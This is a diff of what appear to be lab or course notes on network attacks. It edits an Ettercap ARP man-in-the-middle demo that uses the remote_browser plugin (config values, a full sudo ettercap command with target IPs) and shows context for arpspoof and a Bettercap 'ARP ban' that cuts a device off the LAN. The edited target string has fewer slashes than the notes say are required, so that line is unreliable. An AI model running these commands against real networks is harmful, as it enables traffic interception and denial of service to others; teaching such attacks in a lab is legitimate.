@@ -147,15 +147,15 @@ arpspoof $VICTIM_IP
 > 
 > * Old demo of Ettercap's `remote_browser` plugin:
 >     1. Make sure you have an appropriately configured `etter.conf`:
->         * Set `ec_uid` and `ec_gid` to user ID and group ID number you want Ettercap to become, e.g., `ec_uid = 1001`
->         * Set `remote_browser` to a command that makes sense, such as opening your Web browser, e.g., `remote_browser = "open http://%host%url"`
+>         * Set `ec_uid` and `ec_gid` to user ID and group ID number you want Ettercap to become, e.g., `ec_uid = 1000`
+>         * Set `remote_browser` to a command that makes sense, such as opening your Web browser, e.g., `remote_browser = "sudo -u vagrant xdg-open http://%host%url"`
 >     1. Launch Ettercap in `--text` interface mode, performing an ARP MITM attack that also snarfs packets bound for remote networks (`--mitm arp:remote`) with the `--plugin` for the `remote_browser` activated and a chosen target:
 >         ```sh
 >         # Targets are specified as `[MAC address]/[IPv4 range]/[IPv6 range]/[port range]`
 >         # The three delimiting slashes are required, the values are not. A missing value means "any."
 >         # If `ettercap` complains about the "wrong number" of slashes (`/`), you may have
 >         # a copy that does not have IPv6 support. See `ettercap -h | grep ^TARGET` to check target syntax.
->         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /192.168.9.10// /192.168.2.1//80
+>         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /172.22.33.50// /172.22.33.10/80
 >         ```
 > * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that knocks a device off the LAN:
 >     1. Launch `bettercap` with `sudo bettercap`
